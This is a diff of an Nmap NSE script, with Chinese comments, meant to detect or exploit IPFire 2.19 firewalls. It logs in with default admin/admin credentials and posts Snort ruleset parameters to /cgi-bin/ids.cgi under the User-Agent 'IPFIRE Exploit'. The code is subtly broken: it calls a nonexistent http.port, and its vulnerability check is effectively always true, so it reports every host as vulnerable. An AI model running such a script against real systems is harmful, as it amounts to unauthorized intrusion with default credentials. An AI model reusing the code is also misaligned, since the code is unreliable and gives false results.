@@ -24,49 +24,35 @@ categories = {'discovery', 'exploit', 'vuln'}
 
 ---
 --@usage
--- nmap --script ipfire-vuln -p 444 <host>
+-- nmap --script ipfire-2.19-vuln -p 444 <host>
 --
 --@output
 -- 444/tcp open  IPFire 2.19 Firewall
 -- |_此处为注释内容
 -- |_此次应为nmap扫描的该IPFire的banner信息。
 
-portrule = shortport.http
+portrule = shortport.portnumber(444, 'tcp')
 
 -- 根据自己配置的要求更改端口。
 
 --local evildata = {'ENABLE_SNORT_GREEN:on','ENABLE_SNORT:on','RULES:registered','OINKCODE: ','ACTION: Download new ruleset','ACTION2:snort'}
 --local headers = {'Accept-Encoding : gzip, deflate, br','Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent:IPFIRE Exploit','Referer:' .. url,'Upgrade-Insecure-Requests:1'}
 
-action = function(host, port，)
+action = function(host, port)
   local username = "admin"
   local password = "admin"
-  local url = host.ip .. ":" .. port.number .."/cgi-bin/ids.cgi"
-  local data = {
-    ['ENABLE_SNORT_GREEN'] = ('on')
-    ['ENABLE_SNORT'] = ('on')
-    ['RULES'] = ('registered')
-    ['OINKCODE'] = ()
-    ['ACTION'] = ('Download new ruleset')
-    ['ACTION2'] = ('snort')
+  local url = "https://"..host.ip..":"..port.number.."/cgi-bin/ids.cgi"
+  local data = {['ENABLE_SNORT_GREEN'] ='on',['ENABLE_SNORT'] = 'on',['RULES'] = 'registered',['OINKCODE'] = '',['ACTION'] = 'Download new ruleset',['ACTION2'] = 'snort'}
+  local headers = {['Accept-Encoding'] = 'gzip, deflate, br',['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',['User-Agent'] = 'IPFIRE Exploit',['Referer'] = url,['Upgrade-Insecure-Requests'] = '1'}
 
-  }
-  local headers = {
-    ['Accept-Encoding'] = ('gzip, deflate, br')
-    ['Accept'] = ('text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
-    ['User-Agent'] = ('IPFIRE Exploit')
-    ['Referer'] = url
-    ['Upgrade-Insecure-Requests'] = ('1')
-
-  }
-  
-  local req = http.port (url, data, headers, username, password)
+  req = http.port (url, data, headers, username, password)
 
 
-if ( req.status == 200 or 'uid=99(nobody)')then
+if ( req.status == 200 or string.match('uid=99(nobody'))then
   print "[+] IPFire Installation is Vulnerable [+]"
 
 else
   print "[+] Not Vulnerable [+]"
 
+end
 end
